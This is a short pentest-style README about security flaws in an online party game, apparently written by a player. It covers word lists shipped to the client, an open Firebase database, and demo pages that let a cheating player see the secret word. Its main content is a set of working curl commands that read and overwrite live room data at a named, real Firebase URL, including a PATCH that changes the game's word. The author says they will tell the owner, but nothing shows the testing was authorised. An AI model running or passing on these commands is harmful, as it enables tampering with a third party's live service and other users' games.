# Game:
larpit.netlify.app

## I will inform game owner

## Pentested Vulns:

#### Game puts too much trust on clients

#### Game puts all possible words on client side

#### Multiplayer game Databased exposed:
https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE].json

#### Database write, anyone can change the word:

## Demos

### ANTI_LARP

`anti_larp.html` is a deduction engine made by the fact that all the words are on the client side, therefore in a non-multiplayer, single device game, the larper can have this open to deduct the words that don't make sense, resulting in a elevated chance of victory as a larper.

### REALITY_ROOM

`reality_room_intel.html` is a database intelligence engine, because the multiplayer game database is exposed, anyone can see everything. In a multiplayer game, all the larper has to do is to open up this page, type the roomcode and then they have the word, resulting in an instant victory as a larper.

### MASTER_OOGWAY'S_SCRIBE

This, in my opinion is the most dangerous vulnerability out of all of them. However, it wont work on chromebooks. This vuln allows the attacker(Not larper) to modify the actual database of anygame/file. How it works: 
     
To read:
`curl 'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/ROOM_CODE.json' | jq`    

To write: 
`curl -i -X PUT \
  'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE_OR_CUSTOM_DB].json' \
  -H 'Content-Type: application/json' \
  --data '{"test":true, "instructions": write your custom DB here}'` 


      
OR(change the word to something custom example): `curl -i -X PATCH \
  'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE].json' \
  -H 'Content-Type: application/json' \
  --data '{"word":"ImDaBest"}'`
         
  

There are so many vulnerabilities because of client side logic, that you can simply control the MULTIPLAYER game with client side inspect element console. All you have to do is open the JS console and start running any functions of your choosing. I wont bother to write tools for this.
